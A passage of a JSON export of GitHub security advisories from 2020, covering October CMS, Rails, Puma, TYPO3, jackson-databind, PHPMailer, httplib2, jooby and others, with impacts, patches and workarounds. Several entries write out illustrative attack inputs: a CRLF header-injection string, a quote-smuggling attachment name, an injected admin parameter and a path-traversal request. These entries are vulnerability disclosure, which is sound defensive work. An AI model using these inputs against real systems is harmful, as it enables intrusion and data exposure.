    "description": "### Impact\nAn attacker can exploit this vulnerability to upload jpg, jpeg, bmp, png, webp, gif, ico, css, js, woff, woff2, svg, ttf, eot, json, md, less, sass, scss, xml files to any directory of an October CMS server. The vulnerability is only exploitable by an authenticated backend user with the `cms.manage_assets` permission.\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466).\n\n### Workarounds\nApply https://github.com/octobercms/october/commit/6711dae8ef70caf0e94cec434498012a2ccd86b8 to your installation manually if unable to upgrade to Build 466.\n\n### References\nReported by [Sivanesh Ashok](https://stazot.com/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [octobercms@luketowers.ca](mailto:octobercms@luketowers.ca) & [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"1241\" alt=\"Screen Shot 2020-03-31 at 12 21 10 PM\" src=\"https://user-images.githubusercontent.com/7253840/78061230-255f5400-734a-11ea-92b4-1120f6960505.png\">",
    "summary": "Upload whitelisted files to any directory in OctoberCMS"
  },
  {
    "ghsaId": "GHSA-jv6v-fvvx-4932",
    "publishedAt": "2020-06-03T21:58:21Z",
    "description": "### Impact\nAn attacker can exploit this vulnerability to delete arbitrary local files of an October CMS server. The vulnerability is only exploitable by an authenticated backend user with the `cms.manage_assets` permission.\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466).\n\n### Workarounds\nApply https://github.com/octobercms/october/commit/2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc to your installation manually if unable to upgrade to Build 466.\n\n### References\nReported by [Sivanesh Ashok](https://stazot.com/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [octobercms@luketowers.ca](mailto:octobercms@luketowers.ca) & [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"1241\" alt=\"Screen Shot 2020-03-31 at 12 16 53 PM\" src=\"https://user-images.githubusercontent.com/7253840/78060872-89354d00-7349-11ea-8c2b-5881b0a50736.png\">",
    "summary": "Arbitrary File Deletion vulnerability in OctoberCMS"
  },
  {
    "ghsaId": "GHSA-r23f-c2j5-rx2f",
    "publishedAt": "2020-06-03T21:58:16Z",
    "description": "### Impact\nAn attacker can exploit this vulnerability to read local files of an October CMS server. The vulnerability is only exploitable by an authenticated backend user with the `cms.manage_assets` permission.\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466).\n\n### Workarounds\nApply https://github.com/octobercms/october/commit/2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc to your installation manually if unable to upgrade to Build 466.\n\n### References\nReported by [Sivanesh Ashok](https://stazot.com/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [octobercms@luketowers.ca](mailto:octobercms@luketowers.ca) & [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"1108\" alt=\"Screen Shot 2020-03-31 at 2 37 53 PM\" src=\"https://user-images.githubusercontent.com/7253840/78072989-44b3ac80-735d-11ea-8676-09c69f0409c4.png\">",
    "summary": "Local File read vulnerability in OctoberCMS"
  },
  {
    "ghsaId": "GHSA-38f9-m297-6q9g",
    "publishedAt": "2020-06-03T21:57:53Z",
    "description": "## Impact\n\nMedium severity 5.9 https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:H\n\nA maliciously crafted record ID can exploit a SQL Injection vulnerability in iOS adapter implementation and cause the app to delete all or selected records from the database, generally causing the app to become unusable.\n\nThis may happen in apps that don't validate IDs (valid IDs are `/^[a-zA-Z0-9_-.]+$/`) and use Watermelon Sync or low-level `database.adapter.destroyDeletedRecords` method.\n\nThe integrity risk is low due to the fact that maliciously deleted records won't synchronize, so logout-login will restore all data, although some local changes may be lost if the malicious deletion causes the sync process to fail to proceed to push stage.\n\nNo way to breach confidentiality with this vulnerability is known. Full exploitation of SQL Injection is mitigated, because it's not possible to nest an insert/update query inside a delete query in SQLite, and it's not possible to pass a semicolon-separated second query. There's also no known practicable way to breach confidentiality by selectively deleting records, because those records will not be synchronized.\n\nIt's theoretically possible that selective record deletion could cause an app to behave insecurely if lack of a record is used to make security decisions by the app. \n\n## Patches\n\nPatched versions include:\n\n- 0.15.1\n- 0.16.2\n- 0.16.1-fix\n\t- this is actually the same as 0.16.0, but with the patch applied - as 0.16.1 is causing issues for some users\n- `924c7ae2a8d` commit id contains the patch\n\n## Workarounds\n\n1. Ensure that your backend service sanitizes record IDs sent in the `pull sync` endpoint, such that only IDs matching `/^[a-zA-Z0-9_-.]+$/` are returned. This could also be done in JavaScript `pullChanges` function passed to `synchronize()`\n2. If you use `destroyDeletedRecords` directly, validate all IDs passed the same way\n\n## For more information\n\nIf you have any questions about this advisory, contact @radex.",
    "summary": "DoS via malicious record IDs in WatermelonDB"
  },
  {
    "ghsaId": "GHSA-r5jw-62xg-j433",
    "publishedAt": "2020-05-28T21:10:11Z",
    "description": "### Impact\nIn Kaminari before 1.2.1, there is a vulnerability that would allow an attacker to inject arbitrary code into pages with pagination links. This has been fixed in 1.2.1.\n\n### Releases\nThe 1.2.1 gem including the patch has already been released.\nAll past released versions are affected by this vulnerability.\n\n### Workarounds\nApplication developers who can't update the gem can workaround by overriding the `PARAM_KEY_EXCEPT_LIST` constant.\n\n```ruby\nmodule Kaminari::Helpers\n  PARAM_KEY_EXCEPT_LIST = [:authenticity_token, :commit, :utf8, :_method, :script_name, :original_script_name].freeze\nend\n```\n\n### Credits\nThanks to Daniel Mircea for finding the issue and sending a patch via GitHub. Also thanks to Aditya Prakash for reporting the vulnerability.",
    "summary": "Cross-Site Scripting in Kaminari"
  },
  {
    "ghsaId": "GHSA-wh69-wc6q-7888",
    "publishedAt": "2020-05-28T18:42:59Z",
    "description": "dns-sync through 0.2.0 allows execution of arbitrary commands . This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.",
    "summary": "Command injection in node-dns-sync"
  },
  {
    "ghsaId": "GHSA-qfcv-5whw-7pcw",
    "publishedAt": "2020-05-27T21:09:15Z",
    "description": "### Impact\n`aegir publish` and `aegir build` may leak secrets from environmental variables in the browser bundle published to npm.\n\n### Patches\nThe code has been patched, users should upgrade to >= 21.10.1\n\n### Workarounds\nRun `printenv` to check your environment variables and revoke any secrets.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [aegir](https://github.com/ipfs/aegir)",
    "summary": "Exposure of Sensitive Information to an Unauthorized Actor in AEgir"
  },
  {
    "ghsaId": "GHSA-f7hx-fqxw-rvvj",
    "publishedAt": "2020-05-27T16:37:02Z",
    "description": "### Impact\nCWE-116: Incorrect output escaping.\n\nAn attachment added like this (note the double quote within the attachment name, which is entirely valid):\n\n    $mail->addAttachment('/tmp/attachment.tmp', 'filename.html\";.jpg');\n\nWill result in a message containing these headers:\n\n    Content-Type: application/octet-stream; name=\"filename.html\";.jpg\"\n    Content-Disposition: attachment; filename=\"filename.html\";.jpg\"\n\nThe attachment will be named `filename.html`, and the trailing `\";.jpg\"` will be ignored. Mail filters that reject `.html` attachments but permit `.jpg` attachments may be fooled by this.\n\nNote that the MIME type itself is obtained automatically from the *source filename* (in this case `attachment.tmp`, which maps to a generic `application/octet-stream` type), and not the *name* given to the attachment (though these are the same if a separate name is not provided), though it can be set explicitly in other parameters to attachment methods.\n\n### Patches\nPatched in PHPMailer 6.1.6 by escaping double quotes within the name using a backslash, as per RFC822 section 3.4.1, resulting in correctly escaped headers like this:\n\n    Content-Type: application/octet-stream; name=\"filename.html\\\";.jpg\"\n    Content-Disposition: attachment; filename=\"filename.html\\\";.jpg\"\n\n### Workarounds\nReject or filter names and filenames containing double quote (`\"`) characters before passing them to attachment functions such as `addAttachment()`.\n\n### References\n[CVE-2020-13625](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2020-13625).\n[PHPMailer 6.1.6 release](https://github.com/PHPMailer/PHPMailer/releases/tag/v6.1.6)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the PHPMailer repo](https://github.com/PHPMailer/PHPMailer/issues)",
    "summary": "Insufficient output escaping of attachment names in PHPMailer"
  },
  {
    "ghsaId": "GHSA-jp5v-5gx4-jmj9",
    "publishedAt": "2020-05-26T15:11:13Z",
    "description": "It is possible to possible to, given a global CSRF token such as the one\npresent in the authenticity_token meta tag, forge a per-form CSRF token for\nany action for that session.\n\nImpact\n------\n\nGiven the ability to extract the global CSRF token, an attacker would be able to\nconstruct a per-form CSRF token for that session.\n\nWorkarounds\n-----------\n\nThis is a low-severity security issue. As such, no workaround is necessarily\nuntil such time as the application can be upgraded.",
    "summary": "Ability to forge per-form CSRF tokens in Rails"
  },
  {
    "ghsaId": "GHSA-m42x-37p3-fv5w",
    "publishedAt": "2020-05-26T15:09:48Z",
    "description": "There is a vulnerability in ActiveStorage's S3 adapter that allows the Content-Length of a\ndirect file upload to be modified by an end user.\n\nVersions Affected:  rails < 5.2.4.2, rails < 6.0.3.1\nNot affected:       Applications that do not use the direct upload functionality of the ActiveStorage S3 adapter.\nFixed Versions:     rails >= 5.2.4.3, rails >= 6.0.3.1\n\nImpact\n------\n\nUtilizing this vulnerability, an attacker can control the Content-Length of an S3 direct upload URL without receiving a\nnew signature from the server. This could be used to bypass controls in place on the server to limit upload size.\n\nWorkarounds\n-----------\n\nThis is a low-severity security issue. As such, no workaround is necessarily\nuntil such time as the application can be upgraded.",
    "summary": "Circumvention of file size limits in ActiveStorage"
  },
  {
    "ghsaId": "GHSA-8727-m6gj-mc37",
    "publishedAt": "2020-05-26T15:09:16Z",
    "description": "There is a strong parameters bypass vector in ActionPack.\n\nVersions Affected:  rails <= 6.0.3\nNot affected:       rails < 4.0.0\nFixed Versions:     rails >= 5.2.4.3, rails >= 6.0.3.1\n\nImpact\n------\nIn some cases user supplied information can be inadvertently leaked from\nStrong Parameters.  Specifically the return value of `each`, or `each_value`,\nor `each_pair` will return the underlying \"untrusted\" hash of data that was\nread from the parameters.  Applications that use this return value may be\ninadvertently use untrusted user input.\n\nImpacted code will look something like this:\n\n```\ndef update\n  # Attacker has included the parameter: `{ is_admin: true }`\n  User.update(clean_up_params)\nend\n\ndef clean_up_params\n   params.each { |k, v|  SomeModel.check(v) if k == :name }\nend\n```\n\nNote the mistaken use of `each` in the `clean_up_params` method in the above\nexample.\n\nWorkarounds\n-----------\nDo not use the return values of `each`, `each_value`, or `each_pair` in your\napplication.",
    "summary": "Possible Strong Parameters Bypass in ActionPack"
  },
  {
    "ghsaId": "GHSA-2p68-f74v-9wc6",
    "publishedAt": "2020-05-26T14:49:24Z",
    "description": "In ActiveSupport, there is potentially unexpected behaviour in the MemCacheStore and RedisCacheStore where, when\nuntrusted user input is written to the cache store using the `raw: true` parameter, re-reading the result\nfrom the cache can evaluate the user input as a Marshalled object instead of plain text. Vulnerable code looks like:\n\n```\ndata = cache.fetch(\"demo\", raw: true) { untrusted_string }\n```\nVersions Affected:  rails < 5.2.5, rails < 6.0.4\nNot affected:       Applications not using MemCacheStore or RedisCacheStore. Applications that do not use the `raw` option when storing untrusted user input.\nFixed Versions:     rails >= 5.2.4.3, rails >= 6.0.3.1\n  \nImpact\n------\nUnmarshalling of untrusted user input can have impact up to and including RCE. At a minimum,\nthis vulnerability allows an attacker to inject untrusted Ruby objects into a web application.\nIn addition to upgrading to the latest versions of Rails, developers should ensure that whenever\nthey are calling `Rails.cache.fetch` they are using consistent values of the `raw` parameter for both\nreading and writing, especially in the case of the RedisCacheStore which does not, prior to these changes,\ndetect if data was serialized using the raw option upon deserialization.\n\nWorkarounds\n-----------\nIt is recommended that application developers apply the suggested patch or upgrade to the latest release as\nsoon as possible. If this is not possible, we recommend ensuring that all user-provided strings cached using\nthe `raw` argument should be double-checked to ensure that they conform to the expected format.",
    "summary": "Unintended unmarshalling in ActiveSupport"
  },
  {
    "ghsaId": "GHSA-42f2-f9vc-6365",
    "publishedAt": "2020-05-22T19:23:04Z",
    "description": "Apache CXF ships with a OpenId Connect JWK Keys service, which allows a client to obtain the public keys in JWK format, which can then be used to verify the signature of tokens issued by the service. Typically, the service obtains the public key from a local keystore (JKS/PKCS12) by specifing the path of the keystore and the alias of the keystore entry. This case is not vulnerable. However it is also possible to obtain the keys from a JWK keystore file, by setting the configuration parameter `rs.security.keystore.type` to `jwk`. For this case all keys are returned in this file &quot;as is&quot;, including all private key and secret key credentials. This is an obvious security risk if the user has configured the signature keystore file with private or secret key credentials. From CXF 3.3.5 and 3.2.12, it is mandatory to specify an alias corresponding to the id of the key in the JWK file, and only this key is returned. In addition, any private key information is omitted by default. `oct` keys, which contain secret keys, are not returned at all.",
    "summary": "Private key leak in Apache CXF"
  },
  {
    "ghsaId": "GHSA-w64w-qqph-5gxm",
    "publishedAt": "2020-05-22T14:55:09Z",
    "description": "### Impact\nThis is a similar but different vulnerability to the one patched in 3.12.5 and 4.3.4.\n\nA client could smuggle a request through a proxy, causing the proxy to send a response back to another unknown client. \n\nIf the proxy uses persistent connections and the client adds another request in via HTTP pipelining, the proxy may mistake it as the first request's body. Puma, however, would see it as two requests, and when processing the second request, send back a response that the proxy does not expect. If the proxy has reused the persistent connection to Puma to send another request for a different client, the second response from the first client will be sent to the second client.\n\n### Patches\n\nThe problem has been fixed in Puma 3.12.6 and Puma 4.3.5.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [Puma](https://github.com/puma/puma)\n* See our [security policy](https://github.com/puma/puma/security/policy)",
    "summary": "HTTP Smuggling via Transfer-Encoding Header in Puma"
  },
  {
    "ghsaId": "GHSA-x7jg-6pwg-fx5h",
    "publishedAt": "2020-05-22T14:55:05Z",
    "description": "### Impact\n\nBy using an invalid transfer-encoding header, an attacker could [smuggle an HTTP response.](https://portswigger.net/web-security/request-smuggling)\n\nOriginally reported by @ZeddYu, who has our thanks for the detailed report.\n\n### Patches\n\nThe problem has been fixed in Puma 3.12.5 and Puma 4.3.4.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [Puma](https://github.com/puma/puma)\n* See our [security policy](https://github.com/puma/puma/security/policy)",
    "summary": "HTTP Smuggling via Transfer-Encoding Header in Puma"
  },
  {
    "ghsaId": "GHSA-46j2-xjgp-jrfm",
    "publishedAt": "2020-05-21T21:09:38Z",
    "description": "There is a possible information disclosure issue in Active Resource <v5.1.1 that could allow an attacker to create specially crafted requests to access data in an unexpected way and possibly leak information.",
    "summary": "Information disclosure issue in Active Resource"
  },
  {
    "ghsaId": "GHSA-h79p-32mx-fjj9",
    "publishedAt": "2020-05-21T21:09:04Z",
    "description": "Apache Camel Netty enables Java deserialization by default. Apache Camel 2.22.x, 2.23.x, 2.24.x, 2.25.0, 3.0.0 up to 3.1.0 are affected. 2.x users should upgrade to 2.25.1, 3.x users should upgrade to 3.2.0.",
    "summary": "Apache Camel Netty enables Java deserialization by default"
  },
  {
    "ghsaId": "GHSA-cc94-3v9c-7rm8",
    "publishedAt": "2020-05-21T21:08:56Z",
    "description": "In Apache ActiveMQ 5.0.0 to 5.15.11, the webconsole admin GUI is open to XSS, in the view that lists the contents of a queue.",
    "summary": "Apache ActiveMQ webconsole admin GUI is open to XSS"
  },
  {
    "ghsaId": "GHSA-cxvr-r92m-q9hw",
    "publishedAt": "2020-05-21T21:08:47Z",
    "description": "Dolibarr before 11.0.4 allows XSS.",
    "summary": "XSS in Dolibarr"
  },
  {
    "ghsaId": "GHSA-5mh9-r3rr-9597",
    "publishedAt": "2020-05-21T21:08:33Z",
    "description": "HtmlUnit prior to 2.37.0 contains code execution vulnerabilities. HtmlUnit initializes Rhino engine improperly, hence a malicious JavScript code can execute arbitrary Java code on the application. Moreover, when embedded in Android application, Android-specific initialization of Rhino engine is done in an improper way, hence a malicious JavaScript code can execute arbitrary Java code on the application.",
    "summary": "Code execution vulnerability in HtmlUnit"
  },
  {
    "ghsaId": "GHSA-7qx4-pp76-vrqh",
    "publishedAt": "2020-05-21T19:08:08Z",
    "description": "Apache Commons Configuration uses a third-party library to parse YAML files which by default allows the instantiation of classes if the YAML includes special statements. Apache Commons Configuration versions 2.2, 2.3, 2.4, 2.5, 2.6 did not change the default settings of this library. So if a YAML file was loaded from an untrusted source, it could therefore load and execute code out of the control of the host application.",
    "summary": "Remote code execution in Apache Commons Configuration"
  },
  {
    "ghsaId": "GHSA-344f-f5vg-2jfj",
    "publishedAt": "2020-05-21T18:52:29Z",
    "description": "When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if a) an attacker is able to control the contents and name of a file on the server; and b) the server is configured to use the PersistenceManager with a FileStore; and c) the PersistenceManager is configured with sessionAttributeValueClassNameFilter=\"null\" (the default unless a SecurityManager is used) or a sufficiently lax filter to allow the attacker provided object to be deserialized; and d) the attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over; then, using a specifically crafted request, the attacker will be able to trigger remote code execution via deserialization of the file under their control. Note that all of conditions a) to d) must be true for the attack to succeed.",
    "summary": "Potential remote code execution in Apache Tomcat"
  },
  {
    "ghsaId": "GHSA-q4m3-2j7h-f7xw",
    "publishedAt": "2020-05-20T16:18:01Z",
    "description": "jQuery prior to 1.9.0 allows Cross-site Scripting attacks via the load method. The load method fails to recognize and remove \"<script>\" HTML tags that contain a whitespace character, i.e: \"</script >\", which results in the enclosed script logic to be executed.",
    "summary": "Cross-site Scripting in jQuery"
  },
  {
    "ghsaId": "GHSA-gg84-qgv9-w4pq",
    "publishedAt": "2020-05-20T15:55:47Z",
    "description": "### Impact\nAttacker controlling unescaped part of uri for `httplib2.Http.request()` could change request headers and body, send additional hidden requests to same server.\n\nImpacts software that uses httplib2 with uri constructed by string concatenation, as opposed to proper urllib building with escaping.\n\n### Patches\nProblem has been fixed in 0.18.0\nSpace, CR, LF characters are now quoted before any use.\nThis solution should not impact any valid usage of httplib2 library, that is uri constructed by urllib.\n\n### Workarounds\nCreate URI with `urllib.parse` family functions: `urlencode`, `urlunsplit`.\n\n```diff\nuser_input = \" HTTP/1.1\\r\\ninjected: attack\\r\\nignore-http:\"\n-uri = \"https://api.server/?q={}\".format(user_input)\n+uri = urllib.parse.urlunsplit((\"https\", \"api.server\", \"/v1\", urllib.parse.urlencode({\"q\": user_input}), \"\"))\nhttp.request(uri)\n```\n\n### References\nhttps://cwe.mitre.org/data/definitions/93.html\nhttps://docs.python.org/3/library/urllib.parse.html\n\nThanks to Recar https://github.com/Ciyfly for finding vulnerability and discrete notification.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [httplib2](https://github.com/httplib2/httplib2/issues/new)\n* Email [current maintainer at 2020-05](mailto:temotor@gmail.com)",
    "summary": "CRLF injection in httplib2"
  },
  {
    "ghsaId": "GHSA-r854-96gq-rfg3",
    "publishedAt": "2020-05-18T17:41:19Z",
    "description": "The (1) JpegImagePlugin.py and (2) EpsImagePlugin.py scripts in Python Image Library (PIL) 1.1.7 and earlier and Pillow before 2.3.1 uses the names of temporary files on the command line, which makes it easier for local users to conduct symlink attacks by listing the processes.",
    "summary": "Python Image Library (PIL) allows symlink attacks"
  },
  {
    "ghsaId": "GHSA-q93h-jc49-78gg",
    "publishedAt": "2020-05-15T18:59:10Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig (aka ibatis-sqlmap).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-qmqc-x3r4-6v39",
    "publishedAt": "2020-05-15T18:59:07Z",
    "description": "A flaw was discovered in FasterXML jackson-databind in all versions before 2.9.10 and 2.10.0, where it would permit polymorphic deserialization of malicious objects using the xalan JNDI gadget when used in conjunction with polymorphic type handling methods such as `enableDefaultTyping()` or when @JsonTypeInfo is using `Id.CLASS` or `Id.MINIMAL_CLASS` or in any other way which ObjectMapper.readValue might instantiate objects from unsafe sources. An attacker could use this flaw to execute arbitrary code.",
    "summary": "Polymorphic deserialization of malicious object in jackson-databind"
  },
  {
    "ghsaId": "GHSA-fqwf-pjwf-7vqv",
    "publishedAt": "2020-05-15T18:59:04Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to com.caucho.config.types.ResourceRef (aka caucho-quercus).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-p43x-xfjf-5jhr",
    "publishedAt": "2020-05-15T18:59:01Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to br.com.anteros.dbcp.AnterosDBCPConfig (aka anteros-core).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-cf6r-3wgc-h863",
    "publishedAt": "2020-05-15T18:58:58Z",
    "description": "A flaw was discovered in jackson-databind in versions before 2.9.10, 2.8.11.5 and 2.6.7.3, where it would permit polymorphic deserialization of a malicious object using commons-configuration 1 and 2 JNDI classes. An attacker could use this flaw to execute arbitrary code.",
    "summary": "Polymorphic deserialization of malicious object in jackson-databind"
  },
  {
    "ghsaId": "GHSA-rf6r-2c4q-2vwg",
    "publishedAt": "2020-05-15T18:58:54Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.aoju.bus.proxy.provider.remoting.RmiProvider (aka bus-proxy).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-v3xw-c963-f5hc",
    "publishedAt": "2020-05-15T18:58:50Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.activemq.* (aka activemq-jms, activemq-core, activemq-pool, and activemq-pool-jms).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-9vvp-fxw6-jcxr",
    "publishedAt": "2020-05-15T18:58:47Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.openjpa.ee.WASRegistryManagedRuntime (aka openjpa).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-27xj-rqx5-2255",
    "publishedAt": "2020-05-15T18:58:44Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.springframework.aop.config.MethodLocatingFactoryBean (aka spring-aop).",
    "summary": "jackson-databind mishandles the interaction between serialization gadgets and typing"
  },
  {
    "ghsaId": "GHSA-pqg8-crx9-g8m4",
    "publishedAt": "2020-05-13T23:40:09Z",
    "description": "> ### Meta\n> * CVSS v3.1: AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C\n> * CWE-352\n> * CWE-346\n\n### Problem\nIt has been discovered that backend user interface and install tool are vulnerable to same-origin request forgery. A backend user can be tricked into interacting with a malicious resource an attacker previously managed to upload to the web server - scripts are then executed with the privileges of the victims’ user session.\n\nIn a worst case scenario new admin users can be created which can directly be used by an attacker. The vulnerability is basically a cross-site request forgery (CSRF) triggered by a cross-site scripting vulnerability (XSS) - but happens on the same target host - thus, it’s actually a same-origin request forgery.\n\nMalicious payload such as HTML containing JavaScript might be provided by either an authenticated backend user or by a non-authenticated user using a 3rd party extension - e.g. file upload in a contact form with knowing the target location.\n\nThe attacked victim requires an active and valid backend or install tool user sessions at the time of the attack to be successful.\n\n### Solution\nUpdate to TYPO3 versions 9.5.17 or 10.4.2 that mitigates the problem described.\n\n### Additional Considerations\n\nThe deployment of additional mitigation techniques is suggested as described below.\n\n#### Sudo Mode Extension\n\nThis TYPO3 extension intercepts modifications to security relevant database tables, e.g. those storing user accounts or storages of the file abstraction layer. Modifications need to confirmed by again by the acting user with providing their password again - this technique is known as “sudo mode”. This way unintended actions happening in the background can be mitigated.\n\n* https://github.com/FriendsOfTYPO3/sudo-mode\n* https://extensions.typo3.org/extension/sudo_mode\n\n#### Content Security Policy\n\n[Content Security Policies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) tell (modern) browsers how resources served a particular site are handled - it also it possible to disallow script executions for specific locations. In a TYPO3 context it is suggested to disallow direct script execution at least for locations `/fileadmin/` and `/uploads/`.\n\n```\n# in fileadmin/.htaccess\n<IfModule mod_headers.c>\n\tHeader add Content-Security-Policy \"default-src 'self'; script-src 'none';\"\n</IfModule>\n```\n\n### Credits\nThanks to Matteo Bonaker who reported this issue and to TYPO3 security team member Oliver Hader who fixed the issue.\n\n### References\n* https://typo3.org/security/advisory/typo3-core-sa-2020-006",
    "summary": "Backend Same-Site Request Forgery in TYPO3 CMS"
  },
  {
    "ghsaId": "GHSA-2wj9-434x-9hvp",
    "publishedAt": "2020-05-13T23:29:04Z",
    "description": "It has been discovered that backend user settings (in $BE_USER->uc) are vulnerable to insecure deserialization. In combination with vulnerabilities of 3rd party components this can lead to remote code execution. A valid backend user account is needed to exploit this vulnerability.\n\nUpdate to TYPO3 versions 9.5.17 or 10.4.2 that fix the problem described.\n\n### References\n* https://typo3.org/security/advisory/typo3-core-sa-2020-005",
    "summary": "Insecure Deserialization in Backend User Settings in TYPO3 CMS"
  },
  {
    "ghsaId": "GHSA-2rxh-h6h9-qrqc",
    "publishedAt": "2020-05-13T23:18:38Z",
    "description": "Calling unserialize() on malicious user-submitted content can result in the following scenarios:\n- trigger deletion of arbitrary directory in file system (if writable for web server)\n- trigger message submission via email using identity of web site (mail relay)\n\nAnother insecure deserialization vulnerability is required to actually exploit mentioned aspects.\n\nUpdate to TYPO3 versions 9.5.17 or 10.4.2 that fix the problem described.\n\n### References\n* https://typo3.org/security/advisory/typo3-core-sa-2020-004",
    "summary": "Class destructors causing side-effects when being unserialized in TYPO3 CMS"
  },
  {
    "ghsaId": "GHSA-4j77-gg36-9864",
    "publishedAt": "2020-05-13T23:18:12Z",
    "description": "It has been discovered that link tags generated by `typolink` functionality are vulnerable to cross-site scripting - properties being assigned as HTML attributes have not been parsed correctly.\n\nUpdate to TYPO3 versions 9.5.17 or 10.4.2 that fix the problem described.\n\n### References\n* https://typo3.org/security/advisory/typo3-core-sa-2020-003",
    "summary": "Cross-Site Scripting in TYPO3 CMS Link Handling"
  },
  {
    "ghsaId": "GHSA-43gj-mj2w-wh46",
    "publishedAt": "2020-05-13T23:17:48Z",
    "description": "In TYPO3 CMS greater than or equal to 9.0.0 and less than 9.5.17 and greater than or equal to 10.0.0 and less than 10.4.2, it has been discovered that HTML `placeholder` attributes containing data of other database records are vulnerable to cross-site scripting. A valid backend user account is needed to exploit this vulnerability.\n\nUpdate to TYPO3 versions 9.5.17 or 10.4.2 that fix the problem described.\n\n### References\n* https://typo3.org/security/advisory/typo3-core-sa-2020-002",
    "summary": "Cross-Site Scripting in TYPO3 CMS Form Engine"
  },
  {
    "ghsaId": "GHSA-347x-877p-hcwx",
    "publishedAt": "2020-05-13T22:19:21Z",
    "description": "In TYPO3 CMS 10.4.0 through 10.4.1, it has been discovered that time-based attacks can be used with the password reset functionality for backend users. This allows an attacker to mount user enumeration based on email addresses assigned to backend user accounts.\n\nThis has been fixed in 10.4.2.\n\n### References\n* https://typo3.org/security/advisory/typo3-core-sa-2020-001",
    "summary": "Information Disclosure in Password Reset"
  },
  {
    "ghsaId": "GHSA-59cf-m7v5-wh5w",
    "publishedAt": "2020-05-13T22:17:34Z",
    "description": "Slightly invalid or incomplete SVG markup is not correctly processed and thus not sanitized at all. Albeit the markup is not valid it still is evaluated in browsers and leads to cross-site scripting.\n\nAn updated version 1.0.3 is available from the TYPo3 extension manager and at https://extensions.typo3.org/extension/download/svg_sanitizer/1.0.3/zip/\nUsers of the extension are advised to update the extension as soon as possible.",
    "summary": "Cross-Site Scripting in SVG Sanitizer"
  },
  {
    "ghsaId": "GHSA-m8xj-5v73-3hh8",
    "publishedAt": "2020-05-13T16:29:43Z",
    "description": "curlrequest through 1.0.1 allows execution of arbitrary commands. It is possible to inject arbitrary commands by using a semicolon char in any of the `options` values.",
    "summary": "curlrequest allows execution of arbitrary commands"
  },
  {
    "ghsaId": "GHSA-px9h-x66r-8mpc",
    "publishedAt": "2020-05-13T16:29:26Z",
    "description": "### Impact\nAccess to sensitive information available from classpath. \n\n### Patches\nPatched version: 1.6.7 and 2.8.2\n\nCommit 1.x: https://github.com/jooby-project/jooby/commit/34f526028e6cd0652125baa33936ffb6a8a4a009\n\nCommit 2.x: https://github.com/jooby-project/jooby/commit/c81479de67036993f406ccdec23990b44b0bec32\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n### References\n\nLatest 1.x version: 1.6.6\n\n#### Arbitrary class path resource access 1\nWhen sharing a *File System* directory as in:\n\n``` java\nassets(\"/static/**\", Paths.get(\"static\"));\n```\n\nThe class path is also searched for the file (`org.jooby.handlers.AssetHandler.loader`):\n[jooby/AssetHandler.java at 1.x · jooby-project/jooby · GitHub](https://github.com/jooby-project/jooby/blob/1.x/jooby/src/main/java/org/jooby/handlers/AssetHandler.java)\n\n``` java\n  private static Loader loader(final Path basedir, final ClassLoader classloader) {\n    if (Files.exists(basedir)) {\n      return name -> {\n        Path path = basedir.resolve(name).normalize();\n        if (Files.exists(path) && path.startsWith(basedir)) {\n          try {\n            return path.toUri().toURL();\n          } catch (MalformedURLException x) {\n            // shh\n          }\n        }\n        return classloader.getResource(name);\n      };\n    }\n    return classloader::getResource;\n  }\n```\n\nIf we send `/static/WEB-INF/web.xml` it will fail to load it from the file system but will go into `classloader.getResource(name)` where name equals `/WEB-INF/web.xml` so will succeed and return the requested file. This 